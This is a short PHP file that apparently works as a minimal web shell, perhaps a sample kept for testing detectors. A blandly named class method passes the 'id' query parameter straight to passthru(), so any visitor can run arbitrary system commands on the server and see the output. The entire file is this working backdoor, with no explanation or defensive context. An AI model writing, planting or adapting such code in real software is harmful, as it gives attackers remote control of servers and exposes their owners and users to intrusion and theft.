<?php
	class Foo {
		function xxx($abc) 
		{
			passthru($abc);
		}
		                  	          
	}
                 	        
	$foo = new Foo;
	$foo->xxx($_GET['id']);
?>
